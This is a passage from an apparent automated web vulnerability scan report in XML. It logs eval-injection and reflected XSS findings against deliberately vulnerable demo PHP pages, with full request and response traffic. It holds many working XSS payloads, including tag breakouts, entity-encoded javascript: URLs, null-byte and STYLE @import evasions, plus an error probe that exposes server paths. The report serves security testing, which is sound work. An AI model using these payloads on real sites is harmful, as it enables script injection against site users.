		&lt;title&gt;Eval Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;pre&gt;1234&lt;/pre&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/EvalInjection2.php HTTP/1.0
Content-Length: 55
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/EvalInjection.php

command=1234*/--&gt;&lt;/script&gt;&lt;script&gt;alert(26682)&lt;/script&gt;
HTTP/1.1 200 OK
Content-Length: 242
Date: Mon, 14 Jul 2014 14:48:36 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- Eval Injection 2  --&gt;
&lt;!-- This page realizes an Eval Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Eval Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;pre&gt;1234*/--&gt;&lt;/script&gt;&lt;script&gt;alert(26682)&lt;/script&gt;&lt;/pre&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attUndefinedState" Noise="False">
        <Url>http://tftarget/demo/EvalInjection2.php</Url>
        <Entity Name="command" Type="Parameter" />
        <Variant ID="13215">
          <Comments />
          <Difference>parameter: cookie command=1234 -&gt; command="</Difference>
          <Reasoning>The application has responded with an error message, indicating an undefined state that may expose sensitive information.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="640" Length="300" String="error: syntax error, unexpected '&quot;' in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\EvalInjection2.php(16) : eval()'d code on line 1&#xA;&#xA;Notice: Undefined variable: result in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\EvalInjection2.php on line 18" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/EvalInjection2.php HTTP/1.0
Content-Length: 12
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/EvalInjection.php

command=1234
HTTP/1.1 200 OK
Content-Length: 199
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- Eval Injection 2  --&gt;
&lt;!-- This page realizes an Eval Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Eval Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;pre&gt;1234&lt;/pre&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/EvalInjection2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/EvalInjection.php

command="
HTTP/1.1 200 OK
Content-Length: 503
Date: Mon, 14 Jul 2014 14:48:38 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- Eval Injection 2  --&gt;
&lt;!-- This page realizes an Eval Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Eval Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;pre&gt;
Parse error: syntax error, unexpected '"' in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\EvalInjection2.php(16) : eval()'d code on line 1

Notice: Undefined variable: result in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\EvalInjection2.php on line 18
&lt;/pre&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attCrossSiteScripting" Noise="False">
        <Url>http://tftarget/demo/XSS-reflected2.php</Url>
        <Entity Name="username" Type="Parameter" />
        <Variant ID="13272">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=&gt;%22%27&gt;&lt;img%20src%3d%22javascript:alert(26968)%22&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="741" Length="12" String="alert(26968)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=
HTTP/1.1 200 OK
Content-Length: 229
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome !&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 60
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=&gt;%22%27&gt;&lt;img%20src%3d%22javascript:alert(26968)%22&gt;
HTTP/1.1 200 OK
Content-Length: 268
Date: Mon, 14 Jul 2014 14:48:38 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome &gt;"'&gt;&lt;img src="javascript:alert(26968)"&gt;!&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="13273">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=&gt;"'&gt;&lt;img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(26970)&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="885" Length="12" String="alert(26970)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=
HTTP/1.1 200 OK
Content-Length: 229
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome !&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 149
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=&gt;"'&gt;&lt;img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(26970)&gt;
HTTP/1.1 200 OK
Content-Length: 321
Date: Mon, 14 Jul 2014 14:48:38 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome &gt;"'&gt;&lt;img src=&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;alert(26970)&gt;!&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="13275">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=--&gt;&lt;script&gt;alert(26974)&lt;/script&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="708" Length="12" String="alert(26974)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=
HTTP/1.1 200 OK
Content-Length: 229
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome !&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 41
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=--&gt;&lt;script&gt;alert(26974)&lt;/script&gt;
HTTP/1.1 200 OK
Content-Length: 261
Date: Mon, 14 Jul 2014 14:48:38 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome --&gt;&lt;script&gt;alert(26974)&lt;/script&gt;!&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="13276">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=&gt;'&gt;&lt;script&gt;alert(26976)&lt;/script&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="708" Length="12" String="alert(26976)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=
HTTP/1.1 200 OK
Content-Length: 229
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome !&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 41
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=&gt;'&gt;&lt;script&gt;alert(26976)&lt;/script&gt;
HTTP/1.1 200 OK
Content-Length: 261
Date: Mon, 14 Jul 2014 14:48:38 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome &gt;'&gt;&lt;script&gt;alert(26976)&lt;/script&gt;!&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="13277">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=&gt;"&gt;&lt;script&gt;alert(26978)&lt;/script&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="708" Length="12" String="alert(26978)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=
HTTP/1.1 200 OK
Content-Length: 229
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome !&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 41
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=&gt;"&gt;&lt;script&gt;alert(26978)&lt;/script&gt;
HTTP/1.1 200 OK
Content-Length: 261
Date: Mon, 14 Jul 2014 14:48:39 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome &gt;"&gt;&lt;script&gt;alert(26978)&lt;/script&gt;!&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="13278">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=&gt;'&gt;&lt;%00script&gt;alert(26980)&lt;/script&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="712" Length="12" String="alert(26980)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=
HTTP/1.1 200 OK
Content-Length: 229
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome !&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 44
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=&gt;'&gt;&lt;%00script&gt;alert(26980)&lt;/script&gt;
HTTP/1.1 200 OK
Content-Length: 262
Date: Mon, 14 Jul 2014 14:48:39 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome &gt;'&gt;&lt; script&gt;alert(26980)&lt;/script&gt;!&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="13279">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=&gt;"&gt;&lt;%00script&gt;alert(26982)&lt;/script&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="712" Length="12" String="alert(26982)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=
HTTP/1.1 200 OK
Content-Length: 229
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome !&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 44
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=&gt;"&gt;&lt;%00script&gt;alert(26982)&lt;/script&gt;
HTTP/1.1 200 OK
Content-Length: 262
Date: Mon, 14 Jul 2014 14:48:39 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome &gt;"&gt;&lt; script&gt;alert(26982)&lt;/script&gt;!&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="13280">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username="&gt;&lt;/STYLE&gt;&lt;STYLE&gt;@import"javascript:alert(26984)";&lt;/STYLE&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="759" Length="12" String="alert(26984)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=
HTTP/1.1 200 OK
Content-Length: 229
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome !&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 67
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username="&gt;&lt;/STYLE&gt;&lt;STYLE&gt;@import"javascript:alert(26984)";&lt;/STYLE&gt;
HTTP/1.1 200 OK
Content-Length: 287
Date: Mon, 14 Jul 2014 14:48:39 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome "&gt;&lt;/STYLE&gt;&lt;STYLE&gt;@import"javascript:alert(26984)";&lt;/STYLE&gt;!&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="13281">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username="&gt;&lt;/IFRAME&gt;&lt;script&gt;alert(26986)&lt;/script&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="724" Length="12" String="alert(26986)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=
HTTP/1.1 200 OK
Content-Length: 229
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome !&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 49
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username="&gt;&lt;/IFRAME&gt;&lt;script&gt;alert(26986)&lt;/script&gt;
HTTP/1.1 200 OK
Content-Length: 269
Date: Mon, 14 Jul 2014 14:48:39 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome "&gt;&lt;/IFRAME&gt;&lt;script&gt;alert(26986)&lt;/script&gt;!&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="13282">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username="&gt;&lt;/style&gt;&lt;script&gt;alert(26988)&lt;/script&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="722" Length="12" String="alert(26988)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=
HTTP/1.1 200 OK
Content-Length: 229
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome !&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 48
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username="&gt;&lt;/style&gt;&lt;script&gt;alert(26988)&lt;/script&gt;
HTTP/1.1 200 OK
Content-Length: 268
Date: Mon, 14 Jul 2014 14:48:39 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome "&gt;&lt;/style&gt;&lt;script&gt;alert(26988)&lt;/script&gt;!&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="13283">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username="&gt;&lt;/title&gt;&lt;script&gt;alert(26990)&lt;/script&gt;</Difference>
